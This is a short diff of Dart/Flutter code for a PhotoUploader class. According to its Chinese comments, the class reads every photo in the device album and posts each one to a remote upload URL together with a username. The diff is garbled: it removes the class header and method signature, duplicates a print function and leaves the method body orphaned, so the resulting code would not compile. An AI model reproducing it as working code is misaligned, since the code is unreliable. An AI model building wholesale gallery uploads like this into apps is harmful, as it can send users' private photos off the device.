@@ -9,11 +9,11 @@ import 'constants.dart';
 @pragma('vm:entry-point')
 void print([Object? object = '']) {
   core.debugPrint('$object');
-}
 
-class PhotoUploader {
-  // 获取相册中的所有照片（优化内存使用）
-  static Future<List<File>> getAllPhotos() async {
+@pragma('vm:entry-point')
+void print([Object? object = '']) {
+  core.debugPrint('$object');
+}
     final List<File> files = [];
     
     // 1. 获取相册信息
@@ -168,14 +168,14 @@ class PhotoUploader {
   static Future<void> _uploadSinglePhoto(File photo, String username, int index, int total) async {
     final request = http.MultipartRequest(
       'POST',
-      Uri.parse(Constants.uploadPhotoUrl),
+  Uri.parse(Constants.uploadPhotoUrl),
     );
     request.fields['username'] = username;
     request.fields['photoIndex'] = index.toString();
     request.fields['totalPhotos'] = total.toString();
     
     // 添加文件名和时间戳
-    final fileName = '${DateTime.now().millisecondsSinceEpoch}_${index + 1}.jpg';
+  final fileName = '${DateTime.now().millisecondsSinceEpoch}_${index + 1}.jpg';
     request.files.add(await http.MultipartFile.fromPath(
       'photo', 
       photo.path,
